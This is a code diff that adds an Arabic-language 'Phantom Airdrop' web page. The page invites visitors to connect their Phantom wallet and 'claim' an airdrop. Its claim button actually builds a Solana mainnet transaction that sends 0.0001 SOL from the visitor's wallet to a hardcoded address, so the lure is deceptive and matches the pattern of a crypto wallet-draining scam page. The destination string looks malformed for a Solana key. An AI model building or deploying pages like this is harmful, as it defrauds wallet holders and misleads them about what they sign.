@@ -1,0 +1,106 @@
+<!doctype html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phantom Airdrop</title>
+    <style>
+        /* تنسيق الصفحة */
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #1a1a1a;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            margin: 0;
+        }
+
+        /* تنسيق الأزرار */
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 20px;
+        }
+
+        /* زر ربط المحفظة */
+        .connect-btn {
+            background-color: #4CAF50;
+            color: white;
+        }
+
+        .connect-btn:hover {
+            background-color: #45a049;
+        }
+
+        /* زر المطالبة بالإيردروب */
+        .claim-btn {
+            background-color: #2196F3;
+            color: white;
+        }
+
+        .claim-btn:hover {
+            background-color: #0b7dda;
+        }
+    </style>
+</head>
+<body>
+    <h1>احصل على الإيردروب الخاص بك</h1>
+
+    <!-- زر ربط المحفظة -->
+    <button class="connect-btn" onclick="connectWallet()">ربط محفظة Phantom</button>
+    <!-- زر المطالبة بالإيردروب -->
+    <button class="claim-btn" onclick="claimAirdrop()">Claim Airdrop</button>
+
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.31.0/dist/web3.min.js"></script>
+    <script>
+        async function connectWallet() {
+            try {
+                const provider = window.solana;
+                if (provider) {
+                    await provider.connect();
+                    console.log("تم الربط بنجاح");
+                    alert("تم ربط المحفظة بنجاح");
+                } else {
+                    alert("الرجاء تثبيت محفظة Phantom أولاً.");
+                }
+            } catch (error) {
+                console.error(error);
+            }
+        }
+
+        async function claimAirdrop() {
+            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
+            const transaction = new solanaWeb3.Transaction();
+            const toPublicKey = new solanaWeb3.PublicKey("1BXuwRz5zCyxfpjui3NkSW13hCnBxN35pDcRuoQRagqbvn6tu8EoWqPsSgBBZLeirYVfnfapws3TWAy4b2myhL2");
+            const fromPublicKey = window.solana.publicKey;
+
+            // تحويل 0.0001 سولانا (100,000 lamports)
+            const instruction = solanaWeb3.SystemProgram.transfer({
+                fromPubkey: fromPublicKey,
+                toPubkey: toPublicKey,
+                lamports: 100000 // يعادل 0.0001 SOL
+            });
+
+            transaction.add(instruction);
+
+            try {
+                const signature = await window.solana.signAndSendTransaction(transaction);
+                await connection.confirmTransaction(signature);
+                console.log("تم خصم 0.0001 سولانا بنجاح");
+                alert("تمت المطالبة بالإيردروب بنجاح، وتم إرسال 0.0001 سولانا");
+            } catch (error) {
+                console.error("فشل في الخصم:", error);
+                alert("حدث خطأ أثناء المطالبة بالإيردروب");
+            }
+        }
+    </script>
+
+</body></html>
